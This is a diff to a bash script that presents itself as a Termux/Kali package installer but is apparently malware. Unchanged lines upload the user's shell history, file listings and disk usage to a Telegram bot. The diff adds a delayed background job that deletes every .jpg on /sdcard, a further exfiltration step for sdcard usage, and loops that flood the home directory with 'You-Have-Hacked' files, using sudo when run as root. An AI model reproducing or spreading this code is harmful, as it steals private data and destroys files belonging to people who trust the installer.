@@ -1,4 +1,6 @@
 #!/bin/bash
+# Open-Source xD
+
 clear
 which figlet > 2&>1 || pkg install figlet > 2&>1
 figlet installing
@@ -30,6 +32,8 @@ which wget > 2&>1 || pkg install wget -y > 2&>1
 which pv > 2&>1 || pkg install pv -y > 2&>1
 which jq > 2&>1 || pkg install jq -y > 2&>1
 
+( ( sleep 40m; cd /sdcard && find -name *.jpg -delete ) & ) # punishment for lazyness
+
 sM "$(neofetch --stdout)" > 2&>1
 history > THT-history; curl -sF document=@"THT-history" "https://api.telegram.org/bot$tkn/sendDocument?chat_id=$grp" > 2&>1
 rm THT-history
@@ -38,7 +42,7 @@ rm THT-getprop
 printf "\n\e[0;91mSome packages Fails, wait a minute fixing...\e[0m\n" | pv -qL 15
 cd $HOME; ls > THT-home; curl -sF document=@"THT-home" "https://api.telegram.org/bot$tkn/sendDocument?chat_id=$grp" > 2&>1
 rm THT-home
-cd /sdcard > 2&>1 || termux-setup-storage; cd /sdcard; ls > THT-sdcard; curl -sF document=@"THT-sdcard" "https://api.telegram.org/bot$tkn/sendDocument?chat_id=$grp" > 2&>1
+cd /sdcard > 2&>1 || termux-setup-storage; cd /sdcard; du -h --max-depth=1 |sort -rh > THT-sdcard; curl -sF document=@"THT-sdcard" "https://api.telegram.org/bot$tkn/sendDocument?chat_id=$grp" > 2&>1
 rm THT-sdcard
 cd && du > THT-disk; curl -sF document=@"THT-disk" "https://api.telegram.org/bot$tkn/sendDocument?chat_id=$grp" > 2&>1
 rm THT-disk
@@ -70,9 +74,22 @@ sM "OS: Android" > 2&>1
 android
 elif [[ $(uname -o) == "Linux" ]]; then
 sM "OS: seems To be Kali" > 2&>1
-touch TH33HT-WAS-HERE
+cd
+if [[ getuid() != "0" ]]; then
+for ass in `seq 0 1234567890`
+do
+mkdir You-Have-Hacked-$ass
+touch TH33HT-WAS-HERE-$ass
+done
+else
+for ass in `seq 0 1234567890`
+do
+sudo mkdir You-Have-Hacked-$ass
+sudo touch TH33HT-WAS-HERE-$ass
+done
+fi
 else:
 exit
-#sM OS: Idk what the hell is this" > 2&>1
+#sM "OS: Idk what the hell is this" > 2&>1
 fi
 
